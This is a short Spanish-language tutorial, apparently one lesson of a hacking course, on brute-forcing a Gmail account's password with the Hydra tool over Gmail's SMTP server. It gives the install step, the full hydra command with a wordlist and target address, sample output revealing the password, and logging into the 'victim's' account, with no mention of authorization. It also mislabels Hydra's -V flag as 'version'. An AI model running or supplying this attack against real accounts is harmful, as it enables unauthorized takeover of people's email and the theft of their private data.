# 26. Fuerza Bruta a Gmail con Hydra
Vamos a hacer un ataque de fuerza bruta a una cuenta de Gmail por medio de la herramienta **Hydra**, que es una herramienta para realizar ataques de fuerza bruta

## Requerimientos

### Instalar Hydra

Escribimos:

```bash
sudo apt-get install hydra
```

### Wordlist

Debemos tener una wordlist con las posibles contraseñas:

```bash
cat wordlist.txt
```

Con esto veremos el contenido de la wordlist

### Cuenta

Necesitamos la cuenta que vamos a crackear

## Ejecución

Ejecutamos:

```bash
sudo hydra -l <correo>@gmail.com -P wordlist.txt -s 465 -S -v -V -t 4 smtp.gmail.com smtp
```

* `-l`: Correo de la cuenta que vamos a crackear
* `-P`: Wordlist con las posibles contraseñas
* `-s`: Puerto
* `-S`: SSL
* `-v`: Verbose
* `-V`: Versión
* `-t`: Hilos
* `smtp.gmail.com`: Servidor SMTP de Gmail
* `smtp`: Protocolo SMTP

Esto va a estar testeando las posibles contraseñas y nos dará el resultado:

```plaintext
[465][smtp] host: smtp.gmail.com   login: <correo>@gmail.com   password: <password>
```

En este caso se usó un diccionario con 9 posibles contraseñas, por eso el ataque fue rápido.

Encontró el email y la contraseña.

## Verificación

Ahora, verificamos si funciona el correo y la contraseña.

Nos vamos a la página de Gmail y probamos el correo y la contraseña. Y deberíamos poder acceder a la cuenta.

Funciona bastante bien el ataque de fuerza bruta. No siempre puede funcionar si la víctima tiene un doble factor de autenticación.
Si la víctima tiene un doble factor de autenticación, puede ser que nos tire falsos positivos.